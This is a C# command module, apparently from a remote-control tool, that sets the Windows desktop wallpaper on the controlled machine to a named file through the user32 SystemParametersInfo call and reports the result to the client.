using Shared;
using System;
using System.Collections.Generic;
using System.IO;
using System.Runtime.InteropServices;

namespace Commands
{
    internal class Wallpaper : ICommand
    {
        public string name { get; } = "wallpaper";

        public string description { get; } = "Set the remote server wallpaper";

        public string syntaxHelper { get; } = "wallpaper [remoteFileName]";

        public bool isLocal { get; } = false;

        public List<string> validArguments { get; } = new List<string>()
        {
            "?"
        };


        public bool PreProcessCommand(List<string> args)
        {
            throw new NotImplementedException();
        }

        public void ClientMethod(List<string> args)
        {
            if (CommandsManager.networkManager.ReadLine() == "OK")
            {
                ColorTools.WriteCommandSuccess("Wallpaper changed");
            }
            else
            {
                ColorTools.WriteCommandError("File not found on the remote server");
            }
        }

        public void ServerMethod(List<string> args)
        {
            var filename = args[0];

            if (!File.Exists(filename))
            {
                CommandsManager.networkManager.WriteLine("FileError");
                return;
            }
            var fileInfo = new FileInfo(filename);

            SystemParametersInfo(SPI_SETDESKWALLPAPER, 0, fileInfo.FullName, SPIF_UPDATEINIFILE | SPIF_SENDCHANGE);

            CommandsManager.networkManager.WriteLine("OK");
        }


        [DllImport("user32.dll", CharSet = CharSet.Auto)]
        static extern int SystemParametersInfo(uint uiAction, uint uiParam, string pvParam, uint fWinIni);

        const int SPI_SETDESKWALLPAPER = 20;
        const int SPIF_UPDATEINIFILE = 1;
        const int SPIF_SENDCHANGE = 2;
    }
}
